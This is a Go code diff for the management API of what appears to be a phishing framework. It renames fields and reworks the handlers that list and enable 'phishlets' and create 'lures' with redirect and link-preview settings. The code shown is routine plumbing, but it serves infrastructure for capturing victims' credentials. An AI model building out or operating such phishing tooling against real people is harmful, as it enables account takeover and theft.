@@ -191,7 +191,7 @@ func (as *ApiServer) getPhishletsHandler(w http.ResponseWriter, r *http.Request)
 		phishletData := map[string]interface{}{
 			"name":        p.Name,
 			"author":      p.Author,
-			"description": p.Description,
+			"description": p.description,
 			"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
 		}
 		phishlets = append(phishlets, phishletData)
@@ -216,9 +216,9 @@ func (as *ApiServer) getPhishletHandler(w http.ResponseWriter, r *http.Request) 
 	phishletData := map[string]interface{}{
 		"name":        p.Name,
 		"author":      p.Author,
-		"description": p.Description,
+		"description": p.description,
 		"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
-		"domains":     p.ProxyHosts,
+		"domains":     p.proxyHosts,
 	}
 	
 	as.jsonResponse(w, ApiResponse{
@@ -231,7 +231,7 @@ func (as *ApiServer) enablePhishletHandler(w http.ResponseWriter, r *http.Reques
 	vars := mux.Vars(r)
 	name := vars["name"]
 	
-	err := as.cfg.EnableSite(name)
+	err := as.cfg.SetSiteEnabled(name, true)
 	if err != nil {
 		as.jsonError(w, err.Error(), http.StatusInternalServerError)
 		return
@@ -247,7 +247,7 @@ func (as *ApiServer) disablePhishletHandler(w http.ResponseWriter, r *http.Reque
 	vars := mux.Vars(r)
 	name := vars["name"]
 	
-	err := as.cfg.DisableSite(name)
+	err := as.cfg.SetSiteEnabled(name, false)
 	if err != nil {
 		as.jsonError(w, err.Error(), http.StatusInternalServerError)
 		return
@@ -315,17 +315,43 @@ func (as *ApiServer) createLureHandler(w http.ResponseWriter, r *http.Request) {
 	hostname, _ := lureData["hostname"].(string)
 	path, _ := lureData["path"].(string)
 	
-	id, err := as.cfg.AddLure(phishletName, hostname, path)
-	if err != nil {
-		as.jsonError(w, err.Error(), http.StatusInternalServerError)
+	// Create a new lure with default settings
+	lure := &Lure{
+		Phishlet:        phishletName,
+		Hostname:        hostname,
+		Path:            path,
+		RedirectUrl:     "",
+		Redirector:      "",
+		UserAgentFilter: "",
+		Info:            "",
+		OgTitle:         "",
+		OgDescription:   "",
+		OgImageUrl:      "",
+		OgUrl:           "",
+		PausedUntil:     0,
+	}
+	
+	as.cfg.AddLure(phishletName, lure)
+	
+	// Find the ID of the lure we just added
+	var lureIndex int = -1
+	for i, l := range as.cfg.lures {
+		if l.Phishlet == phishletName && l.Hostname == hostname && l.Path == path {
+			lureIndex = i
+			break
+		}
+	}
+	
+	if lureIndex == -1 {
+		as.jsonError(w, "Failed to find created lure", http.StatusInternalServerError)
 		return
 	}
 	
-	lure, _ := as.cfg.GetLure(id)
+	lure, _ = as.cfg.GetLure(lureIndex)
 	
 	as.jsonResponse(w, ApiResponse{
 		Success: true,
-		Message: fmt.Sprintf("Created lure with ID: %d", id),
+		Message: fmt.Sprintf("Created lure with ID: %d", lureIndex),
 		Data:    lure,
 	})
 }
@@ -356,8 +382,8 @@ func (as *ApiServer) deleteLureHandler(w http.ResponseWriter, r *http.Request) {
 func (as *ApiServer) getConfigHandler(w http.ResponseWriter, r *http.Request) {
 	config := map[string]interface{}{
 		"domain":       as.cfg.general.Domain,
-		"ip":           as.cfg.general.Ipv4,
-		"redirect_url": as.cfg.general.RedirectUrl,
+		"ip":           as.cfg.general.IP,
+		"redirect_url": as.cfg.general.redirect_url,
 	}
 	
 	as.jsonResponse(w, ApiResponse{
